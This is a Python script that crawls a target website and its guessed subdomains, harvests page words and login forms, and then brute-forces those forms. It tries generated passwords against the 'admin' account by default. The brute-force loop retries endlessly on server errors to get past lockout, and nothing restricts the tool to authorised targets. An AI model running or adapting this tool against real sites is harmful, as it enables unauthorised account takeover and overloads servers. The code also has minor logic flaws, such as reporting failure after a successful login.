from html_parser import HTMLParser
from password_generator import generate_all_passwords
from requests import get_request, get_status, post_request
from url_utils import extract_url_parts, reformat_url

import argparse
import collections
import socket

SUBDOMAINS_FILE_PATH = './subdomains-100.txt'

class Node:
    def __init__(self, url, depth):
        self.url = url
        self.depth = depth

class Counter:
    def __init__(self, count, max_depth, page_max):
        self.count = count
        self.max_depth = max_depth
        self.page_max = page_max

def add_duplicate_url(url, seen):
    # If the URL has a trailing slash, add the URL without the slash to set of seen nodes
    if url[-1] == '/':
        seen.add(url[:-1])
        
    # Else the URL doesn't have a trailing slash and add the URL with a slash to set of seen nodes
    else:
        seen.add(url + '/')       

def process_node(start_url, node, header_dict, forms, keywords, seen, add_next, counter):
    if counter.count >= counter.page_max:
        return
    
    # Make GET request to the current URL      
    html_doc = get_request(node.url, header_dict)
    if html_doc is not None:
        print('Depth ' + str(node.depth) + ': Processing: ' + node.url)
        counter.count += 1

        parser = HTMLParser(html_doc)

        # Extract and add words from current page to the set of keywords
        keywords |= parser.extract_words()

        # If a login form is found, add it to the set
        form_found = parser.detect_login_form()
        if form_found:
            forms.add(node.url)

        # Add reachable URLs from current node if its depth < max depth
        if node.depth < counter.max_depth:
            # Retrieve set of URLs reachable from current node 
            linked_urls = parser.extract_urls()

            for url in linked_urls:
                # Reformat if relative url given
                if 'http' not in url:
                    url = reformat_url(url, node.url)                 

                if url not in seen and url.startswith(start_url):
                    seen.add(url)
                    add_duplicate_url(url, seen)
                    # Traversal dependent function to add next node
                    add_next(url) 

def crawl_bfs(start_url, header_dict, counter):
    forms = set()
    keywords = set()
    seen = set()
    queue = collections.deque()

    if counter.count >= counter.page_max:
        print('\nCrawling Aborted: The maximum number of pages of ' + str(counter.page_max) + ' has been reached!')
    else:
        print('\nStarting Breadth-First Crawling')
        print('-' * 50)
        
        # Add start URL to the queue and set of seen URLs
        start_node = Node(start_url, 0)
        queue.append(start_node)
        seen.add(start_node.url)
        add_duplicate_url(start_node.url, seen)

        # While queue is not empty
        while queue:
            node = queue.popleft()
            add_to_queue = lambda url: queue.append(Node(url, node.depth + 1))  
            process_node(start_url, node, header_dict, forms, keywords, seen, add_to_queue, counter)

            if counter.count >= counter.page_max:
                print('\nCrawling Aborted: The maximum number of pages of ' + str(counter.page_max) + ' has been reached!')
                return keywords, forms, seen
        
    return keywords, forms, seen

def crawl_dfs(start_url, header_dict, counter):
    """ Wrapper function to initialize first call to recursive DFS crawl function """ 
    forms = set()
    keywords = set()
    seen = set()

    if counter.count >= counter.page_max:
        print('\nCrawling Aborted: The maximum number of pages of ' + str(counter.page_max) + ' has been reached!')
    else:
        print('\nStarting Depth-First Crawling')
        print('-' * 50)    
        start_node = Node(start_url, 0)
        # Add start URL to the set of seen URLs
        seen.add(start_node.url)
        add_duplicate_url(start_node.url, seen)
        
        _crawl_dfs(start_url, start_node, header_dict, forms, keywords, seen, counter)
    return keywords, forms, seen

def _crawl_dfs(start_url, node, header_dict, forms, keywords, seen, counter):
    if counter.count >= counter.page_max:
        print('\nCrawling Aborted: The maximum number of pages of ' + str(counter.page_max) + ' has been reached!')
        return
    add_to_stack = lambda url: _crawl_dfs(start_url, Node(url, node.depth + 1), header_dict, forms, keywords, seen, counter)
    process_node(start_url, node, header_dict, forms, keywords, seen, add_to_stack, counter) 

def read_subdomains():
    with open(SUBDOMAINS_FILE_PATH, "r") as f:
        return {subdomain.rstrip() for subdomain in f}

def get_subdomains(url):
    subdomains = read_subdomains()
    host, _, _ = extract_url_parts(url)
    
    url_subdomain = host.split('.')[0] # Subdomain of given URL
    
    # Check to see if the URL already has a subdomain from the list
    if url_subdomain in subdomains:
        host = host.replace(url_subdomain + '.', '')

    return {subdomain + '.' + host for subdomain in subdomains if subdomain != url_subdomain}

def crawl_subdomains(bfs, url, header_dict, counter):
    print('\nCrawling Subdomains')
    print('-' * 50)    
    for subdomain in get_subdomains(url):
        try:
            conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Test whether subdomain exists 
            conn.connect((subdomain, 80))
            subdomain = reformat_url(subdomain)
            print('\nCrawling Subdomain: ' + subdomain)
            if bfs:
                crawl_bfs(subdomain, header_dict, counter)
            else:
                crawl_dfs(subdomain, header_dict, counter)            
        except socket.gaierror:
            print('\nSubdomain ' + subdomain + ' was not found.')
        finally:
            conn.close()    
            
def brute_force(user, keywords, forms, user_agent):
    passwords = generate_all_passwords(keywords)

    for form in forms:
        print('\nAttempting to brute-force: ' + form + '\n')
        get_header = {'User-Agent': user_agent}
        html_doc = get_request(form, get_header)
        parser = HTMLParser(html_doc)

        for password in passwords:
            login = parser.create_login_string(user, password)
            post = {'User-Agent': user_agent,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Content-Length': str(len(login))}

            response = post_request(form, post, login)
            
            if get_status(response) >= 500:
                print('\nHold on, too many failed attempts! Waiting for the server to accept more login requests...\n')
            
            # Continually retry logging in if there is a server error (too many failed attempts)
            while get_status(response) >= 500:
                response = post_request(form, post, login)

            print('Attempting to login...\nUser: ' + user + '\nPassword: ' + password)

            if get_status(response) == 302:
                print('Login Succeeded!\n')
                break
            else:
                print('Login Failed...\n')
        
        print('Ran out of passwords! Bruteforce failed!')
          
def main():
    parser = argparse.ArgumentParser(description='Arguments to proceed web-crawling')
    parser.add_argument('-url', nargs=1, type=str, help='URL', required=True)
    parser.add_argument('--username', nargs=1, type=str, help='Username')
    parser.add_argument('--maxdepth', nargs=1, type=int, help='Max Depth to Crawl')
    parser.add_argument('--maxpages', nargs=1, type=int, help='Max Pages to Crawl')
    parser.add_argument('--mode', nargs=1, type=str, help='Mode of Crawling : "bfs" or "dfs"')
    parser.add_argument('--useragent', nargs=1, type=str, help='User Agent')
    args = parser.parse_args()

    modes = [['bfs'], ['dfs']]

    url = reformat_url(args.url.pop())
    username = 'admin' if args.username is None else args.username
    max_depth = 10 if args.maxdepth is None else args.maxdepth.pop()
    max_pages = 10 if args.maxpages is None else args.maxpages.pop()
    mode = args.mode.pop() if args.mode in modes else 'bfs'

    if (args.useragent is not None):
        user_agent = args.useragent.pop()
        header_dict = {'User-Agent': user_agent}
    else:
        user_agent = 'N/A'
        header_dict = {}

    print('Initiating web crawl with following configuration')
    print('Algorithm: {}, Username: {}, Max Pages: {}, Max Page Depth: {}, User Agent: {}'.format(mode, username, max_pages, max_depth, user_agent))

    page_counter = Counter(0, max_depth, max_pages)

    if mode == 'bfs':
        """
        BFS
        """
        keywords, forms, seen = crawl_bfs(url, header_dict, page_counter)
        crawl_subdomains(True, url, header_dict, page_counter)
    elif mode == 'dfs':
        """
        DFS
        """
        keywords, forms, seen = crawl_dfs(url, header_dict, page_counter)
        crawl_subdomains(False, url, header_dict, page_counter)
    
    brute_force(username, keywords, forms, user_agent)
    print('\n\n\n', get_subdomains(url))

if __name__ == '__main__':
    main()

    